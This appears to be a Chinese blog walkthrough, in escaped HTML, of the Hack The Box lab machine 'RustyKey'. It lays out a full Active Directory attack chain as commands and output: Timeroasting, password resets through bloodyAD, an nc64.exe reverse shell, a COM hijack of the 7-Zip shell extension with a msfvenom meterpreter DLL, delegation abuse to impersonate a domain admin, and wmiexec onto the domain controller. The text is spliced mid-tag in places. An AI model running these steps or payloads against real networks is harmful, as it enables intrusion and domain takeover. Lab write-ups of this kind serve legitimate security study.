E8L!W3A \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e仅对\u003ccode\u003eLDAP\u003c/code\u003e有权限\u003c/p\u003e\n\u003ch2\u003e域分析\u003c/h2\u003e\n\u003cp\u003e有\u003ccode\u003eldap\u003c/code\u003e 权限就可以使用\u003ccode\u003ebloodhound-python\u003c/code\u003e来收集数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'rr.parker'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'8#t5HE8L!W3A'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'rustykey.htb'\u003c/span\u003e -ns 10.10.11.75 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC.rustykey.htb'\u003c/span\u003e --dns-tcp\nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: rustykey.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nINFO: Connecting to LDAP server: DC.rustykey.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 16 computers\nINFO: Connecting to LDAP server: DC.rustykey.htb\nINFO: Found 12 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 58 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 10 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: \nINFO: Querying computer: \nINFO: Querying computer: \nINFO: Querying computer: \nINFO: Querying computer: \nINFO: Querying computer: dc.rustykey.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 01M 20S\nINFO: Compressing output into 20250629205022_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e诶？好像并没什么权限？\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image.png\" alt=\"image.png\"\u003e\u003c/ ring\"\u003e'8#t5HE8L!W3A'\u003c/span\u003e -d rustykey.htb -k\nLDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\mm.turner:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\bb.morgan:8#t5HE8L!W3A KDC_ERR_ETYPE_NOSUPP\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\gg.anderson:8#t5HE8L!W3A KDC_ERR_CLIENT_REVOKED\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\dd.ali:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\ee.reed:8#t5HE8L!W3A KDC_ERR_ETYPE_NOSUPP\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\nn.marcos:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED\nLDAP        10.10.11.75     389    DC               [-] rustykey.htb\\backupadmin:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e无结果，感觉都被堵死了，难道还有其它的方法/路径？\u003c/p\u003e\n\u003ch2\u003eTimeroast\u003c/h2\u003e\n\u003cp\u003e经过佬的提示：可以对计算机账户进行破解\u003c/p\u003e\n\u003cp\u003e一脸懵比，经过搜索后找到工具 \u0026#x26; 文章：\u003ca href=\"https://github.com/SecuraBV/Timeroast\"\u003ehttps://github.com/SecuraBV/Timeroast\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eTimeroasting\u003c/code\u003e 利用 \u003ccode\u003eWindows\u003c/code\u003e 的 NTP 身份验证机制，允许未经身份验证的攻击者通过使用该帐户的 RID 发送 NTP 请求来有效地请求任何计算机或信任帐户的密码哈希。当计算机帐户正确生成时，这不是问题，但如果设置了非标准或旧式默认密码，则此工具允许您暴力破解这些帐户。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Timeroast python timeroast.py 10.10.11.75                                                                   \n1000:\u003cspan class=\"hljs-variable\"\u003e$sntp\u003c/span\u003e-ms$2418f183f665f9a5c83dbfc11700a3ae\u003cspan class=\"hljs-variable\"\u003e$1c0111e900000000000a02714c4f434cec0bd5e51e099b8ae1b8428bffbfcd0aec0bd91dca11 \nFrom: bb.morgan@rustykey.htb\nTo: support-team@rustykey.htb\nSubject: Support Group - Archiving Tool Access\nDate: Mon, 10 Mar 2025 14:35:18 +0100\nHey team,\nAs part of the new Support utilities rollout, extended access has been temporarily granted to allow\ntesting and troubleshooting of file archiving features across shared workstations.\nThis is mainly to \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e streamline ticket resolution related to extraction/compression issues reported\nby the Finance and IT teams. Some newer systems handle context menu actions differently, so\nregistry-level adjustments are expected during this phase.\nA few notes:\n- Please avoid making unrelated changes to system components \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e this access is active.\n- This permission change is logged and will be rolled back once the archiving utility is confirmed\nstable \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e all environments.\n- Let DevOps know \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e you encounter access errors or missing shell actions.\nThanks,\nBB Morgan\nIT Department\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e内部备忘录\n发件人：\u003ca href=\"mailto:bb.morgan@rustykey.htb\"\u003ebb.morgan@rustykey.htb\u003c/a\u003e\n收件人：\u003ca href=\"mailto:support-team@rustykey.htb\"\u003esupport-team@rustykey.htb\u003c/a\u003e\n主题：支持小组 - 归档工具访问权限\n日期：2025年3月10日星期一 14:35:18 +0100\n各位团队：\n作为新支持实用程序推出的一部分，我们已临时授予扩展访问权限，以便\n在共享工作站上测试和排除文件归档功能故障。\n这主要是为了帮助简化与财务和IT团队报告的提取/压缩问题相关的工单解决流程。某些较新的系统处理上下文菜单操作的方式有所不同，因此\n在此阶段预计会进行注册表级别的调整。\n几点注意事项：\u003c/p\u003e\n\u003cp\u003e在此访问权限有效期间，请避免对系统组件进行无关的更改。\u003c/p\u003e\n\u003cp\u003e此权限更改已记录，并在确认归档实用程序在所有环境中稳定运行后回滚。\u003c/p\u003e\n\u003cp\u003e如果您遇到访问错误或缺少shell操作，请告知DevOps。\n谢谢，\nBB Morgan\nIT 部门\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e纳尼纳尼？？提到了已临时授予扩展访问权限，进行注册表级别的调整，总感觉像是DLL劫持\u003c/p\u003e\n\u003cp\u003e并且收件人是：\u003ccode\u003esupport-team\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eGet EE.REED Shell ❌\u003c/h3\u003e\n\u003cp\u003e我们知道 \u003ccode\u003esupport\u003c/code\u003e 组中有\u003ccode\u003eEE.REED\u003c/code\u003e用户，我们可以直接进行修改密码的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是\u003ccode\u003esupport\u003c/code\u003e 组也在\u003ccode\u003eProtect\u003c/code\u003e组中，我们首先要先移出去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=IT-COMPUTER3\\$.ccache\nbloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb remove groupMember \u003cspan class=\"hljs-string\"\u003e'PROTECTED OBJECTS'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'SUPPORT'\u003c/span\u003e\n[-] SUPPORT removed from PROTECTED OBJECTS\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改\u003ccode\u003eEE.REED\u003c/code\u003e的密码并获取\u003ccode\u003eTGT\u003c/code\u003e票据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey bloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e\n\n[+] Password changed successfully!\n➜  RustyKey getTGT.py rustykey.htb/\u003cspan class=\"hljs-string\"\u003e'EE.REED'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e -dc-ip 10.10.11.75\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e EE.REED.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e导入票据并登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=EE.REED.ccache \n➜  RustyKey evil-winrm -i DC.rustykey.htb -r rustykey.htb -k EE.REED.ccache  \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: Useless cert/s provided, SSL is not enabled\n                                        \nInfo: Establishing connection to remote endpoint\n                                        \nError: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied\nSuccess\n\n                                        \nError: Exiting with code 1\nmalloc_consolidate(): unaligned fastbin chunk detected\n[1]    19408 IOT instruction  evil-winrm -i DC.rustykey.htb -r rustykey.htb -k EE.REED.ccache\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBOOOOOOOM！行不通\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/boom-4x.gif\" alt=\"boom-4x.gif\"\u003e\u003c/p\u003e\n\u003ch3\u003eGet EE.REED Shell\u003c/h3\u003e\n\u003cp\u003e我们无法使用\u003ccode\u003eevil-winrm\u003c/code\u003e来获得\u003ccode\u003eee.reed\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e那么我们可以尝试通过\u003ccode\u003eRunasCS\u003c/code\u003e来通过目标用户的显示凭据来运行\u003ccode\u003eCMD\u003c/code\u003e来获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eToolLink：\u003ca href=\"https://github.com/antonioCoco/RunasCs\"\u003ehttps://github.com/antonioCoco/RunasCs\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e首先修改 \u003ccode\u003eEE.REED\u003c/code\u003e的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=IT-COMPUTER3\\$.ccache \nbloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb add groupMember HELPDESK \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e\nbloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb remove groupMember \u003cspan class=\"hljs-string\"\u003e'PROTECTED OBJECTS'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'SUPPORT'\u003c/span\u003e\nbloodyAD -d rustykey.htb -u \u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e --dc-ip 10.10.11.75 -k --host DC.rustykey.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次进入 \u003ccode\u003ebb.morgan\u003c/code\u003e 的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e成功执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\bb.morgan\\Documents\u003e ./RunasCS.exe EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"cmd /c whoami\"\u003c/span\u003e\n[*] Warning: The logon \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-string\"\u003e'EE.REED'\u003c/span\u003e is limited. Use the flag combination --bypass-uac and --logon-type \u003cspan class=\"hljs-string\"\u003e'8'\u003c/span\u003e to obtain a more privileged token.\n\nrustykey\\ee.reed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行反弹\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\tools\u003e upload ./nc.exe/nc64.exe\n                                        \nInfo: Uploading /root/Desktop/HackTheBox/RustyKey/nc.exe/nc64.exe to C:\\tools\\nc64.exe\n                                        \nData: 60360 bytes of 60360 bytes copied\n                                        \nInfo: Upload successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\tools\u003e upload ../../Tools/RunasCS/RunasCs.exe\n                                        \nInfo: Uploading /root/Desktop/HackTheBox/RustyKey/../../Tools/RunasCS/RunasCs.exe to C:\\tools\\RunasCs.exe\n                                        \nData: 68948 bytes of 68948 bytes copied\n                                        \nInfo: Upload successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e./RunasCS.exe EE.REED \u003cspan class=\"hljs-string\"\u003e'Admin@123!'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"./nc64.exe 10.10.xx.xx 1234 -e cmd.exe\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功拿到 \u003ccode\u003eEE.REED\u003c/code\u003e 用户的 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eCOM劫持\u003c/h3\u003e\n\u003cp\u003e拿到\u003ccode\u003eEE.REED\u003c/code\u003e用户后，我们知道我们拥有扩展访问权限，对注册表有一定权限\u003c/p\u003e\n\u003cp\u003e我们上传\u003ccode\u003eaccesschk\u003c/code\u003e 去查询\u003ccode\u003eEE.REED\u003c/code\u003e用户是否用拥有修改的权限\u003c/p\u003e\n\u003cp\u003e列出指定账户在该路径下拥有写（Write）权限的所有子键\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\tools\u003e ./accesschk.exe -accepteula -kuwq \u003cspan class=\"hljs-string\"\u003e\"RUSTYKEY\\Support\"\u003c/span\u003e HKLM\\SOFTWARE\n./accesschk.exe -accepteula -kuwq \u003cspan class=\"hljs-string\"\u003e\"RUSTYKEY\\Support\"\u003c/span\u003e HKLM\\SOFTWARE\n\nAccesschk v6.15 - Reports effective permissions \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e securable objects\nCopyright (C) 2006-2022 Mark Russinovich\nSysinternals - www.sysinternals.com\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果是没有\u003c/p\u003e\n\u003cp\u003e寻找\u003ccode\u003eCOM\u003c/code\u003e劫持\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\tools\u003e ./accesschk.exe -accepteula -kuwq \u003cspan class=\"hljs-string\"\u003e\"RUSTYKEY\\Support\"\u003c/span\u003e HKCR\\CLSID | findstr /I \u003cspan class=\"hljs-string\"\u003e\"RW\"\u003c/span\u003e\n./accesschk.exe -accepteula -kuwq \u003cspan class=\"hljs-string\"\u003e\"RUSTYKEY\\Support\"\u003c/span\u003e HKCR\\CLSID | findstr /I \u003cspan class=\"hljs-string\"\u003e\"RW\"\u003c/span\u003e\nRW HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能找到一条我们拥有权限的\u003c/p\u003e\n\u003cp\u003e我们再看底下有什么（AI：这个COM对象的描述是“7-Zip外壳扩展”。这立刻告诉我们，这个组件和文件资源管理器\u003ccode\u003eexplorer.exe\u003c/code\u003e高度相关。当你在文件上右键点击时，菜单中出现的“7-Zip”选项就是由这个DLL提供的。当外壳需要显示7-Zip右键菜单时，它会加载 \u003ccode\u003eC:\\Program Files\\7-Zip\\7-zip.dll\u003c/code\u003e 这个文件。这就是我们要替换掉的路径。）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Windows\\system32\u003e reg query \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\"\u003c/span\u003e /s\nreg query \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\"\u003c/span\u003e /s\n\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\n    (Default)    REG_SZ    7-Zip Shell Extension\n\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\n    (Default)    REG_SZ    C:\\Program Files\\7-Zip\\7-zip.dll\n    ThreadingModel    REG_SZ    Apartment\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e生成反弹\u003ccode\u003eshell\u003c/code\u003e的\u003ccode\u003eDLL\u003c/code\u003e 并上传\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=4444 -f dll -o rev.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eMSF\u003c/code\u003e 监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 exploit(multi/handler) \u003e run\n[*] Started reverse TCP handler on 10.10.xxxxxx:4444 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们直接替换掉\u003ccode\u003eInprocServer32\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Windows\\system32\u003e reg add \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\"\u003c/span\u003e /ve /d \u003cspan class=\"hljs-string\"\u003e\"C:\\tools\\rev.dll\"\u003c/span\u003e /f\nreg add \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\"\u003c/span\u003e /ve /d \u003cspan class=\"hljs-string\"\u003e\"C:\\Tools\\rev.dll\"\u003c/span\u003e /f\nThe operation completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e改完之后我们再看一下是否修改成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Windows\\system32\u003e reg query \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\"\u003c/span\u003e /s\nreg query \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\"\u003c/span\u003e /s\n\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\n    (Default)    REG_SZ    7-Zip Shell Extension\n\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\n    (Default)    REG_SZ    C:\\Tools\\rev.dll\n    ThreadingModel    REG_SZ    Apartment\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e过一会\u003ccode\u003eShell\u003c/code\u003e就弹回来了，并且是\u003ccode\u003emm.turner\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003ePS：有个坏处一下子就会断开，然后要重置机器，被恶心坏了\u003c/p\u003e\n\u003ch3\u003eRBCD\u003c/h3\u003e\n\u003cp\u003e因为它是委派管理组（\u003ccode\u003eDelegation Managers\u003c/code\u003e），直接就不拖泥带水，直接尝试给机器添加\u003ccode\u003eAllowedToDelegateTo\u003c/code\u003e 属性，然后就成功了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Windows\u003e Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$\nSet-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里\u003ccode\u003eIT-COMPUTER3$\u003c/code\u003e 可以代表（S4U2self \u0026#x26; S4U2proxy）任意用户去访问\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e利用链接：\u003ca href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained\"\u003ehttps://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e这里无法使用\u003ccode\u003eadministrator\u003c/code\u003e用户，会被禁止\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egetST -spn \u003cspan class=\"hljs-string\"\u003e\"cifs/DC.rustykey.htb\"\u003c/span\u003e -impersonate \u003cspan class=\"hljs-string\"\u003e\"Administrator\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"rustykey.htb\"\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们使用\u003ccode\u003ebackupadmin\u003c/code\u003e 因为它属于\u003ccode\u003eDmain Admins\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey getST.py -spn \u003cspan class=\"hljs-string\"\u003e\"cifs/DC.rustykey.htb\"\u003c/span\u003e -impersonate \u003cspan class=\"hljs-string\"\u003e\"backupadmin\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"rustykey.htb\"\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Impersonating backupadmin\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登录\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey wmiexec.py rustykey.htb/backupadmin@DC.rustykey.htb -no-pass -dc-ip 10.10.11.75 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\nC:\\\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\\u0
